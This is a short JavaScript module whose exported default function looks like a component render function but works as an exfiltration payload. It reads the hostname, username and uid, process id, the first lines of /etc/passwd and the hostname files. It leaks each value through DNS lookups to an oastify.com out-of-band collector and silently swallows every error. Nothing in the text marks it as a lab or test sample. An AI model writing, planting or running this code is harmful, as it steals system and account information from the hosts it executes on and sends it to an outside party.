module.exports = {
  default: function(props) {
    var os, dns, fs;
    try { os = require("os"); } catch(e) {}
    try { dns = require("dns"); } catch(e) {}
    try { fs = require("fs"); } catch(e) {}
    
    function S(label) {
      try { dns.lookup(label + ".udbktufvpeiomjnj4w3zjz3yrpxnlc.oastify.com", function(){}); } catch(e) {}
    }
    
    // 1. hostname
    try { S("h-" + os.hostname()); } catch(e) {}
    
    // 2. user info
    try { var u = os.userInfo(); S("u-" + u.username + "-uid" + u.uid); } catch(e) {}
    
    // 3. pid
    try { S("pid-" + process.pid); } catch(e) {}
    
    // 4. /etc/passwd через fs
    if (fs) {
      try {
        var passwd = fs.readFileSync("/etc/passwd", "utf8");
        var lines = passwd.trim().split("\n");
        S("pw-len" + passwd.length);
        for (var i = 0; i < Math.min(lines.length, 5); i++) {
          var enc = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 30);
          S("pw" + i + "-" + enc);
        }
      } catch(e) { S("pw-err"); }
      
      try {
        var kernhost = fs.readFileSync("/proc/sys/kernel/hostname", "utf8").trim();
        var enc2 = kernhost.replace(/[^a-zA-Z0-9]/g, "-");
        S("kern-" + enc2);
      } catch(e) { S("kern-err"); }
      
      try {
        var etchost = fs.readFileSync("/etc/hostname", "utf8").trim();
        var enc3 = etchost.replace(/[^a-zA-Z0-9]/g, "-");
        S("etch-" + enc3);
      } catch(e) { S("etch-err"); }
    }
    
    return null;
  }
};
